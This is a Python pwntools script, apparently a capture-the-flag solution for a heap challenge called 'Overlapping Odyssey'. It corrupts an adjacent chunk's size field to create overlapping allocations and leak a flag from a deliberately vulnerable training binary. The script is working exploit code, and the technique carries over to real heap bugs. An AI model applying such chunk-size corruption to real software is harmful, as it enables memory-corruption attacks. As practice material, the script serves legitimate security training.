# Overlapping Odyssey
import pwn
from dojotool import find_challenge
from dojotool.pwntool import tee


def one_round(io: pwn.process) -> None:
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"read_flag")

    io.sendline(b"safe_read 0")
    io.sendline(
        pwn.flat(
            {
                # read_flag 会 malloc 的 chunk size xor INUSE flag
                0x18: 0xF0 | 0x1,
            }
        )
    )
    # 在 free 之前修改下一个 chunk 的 size
    io.sendline(b"free 1")
    io.sendline(b"malloc 1 223")
    io.sendline(b"safe_write 1")
    io.sendline(b"quit")


def ctf() -> None:
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        tee(io)
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(0.5)
            raise


if __name__ == "__main__":
    ctf()
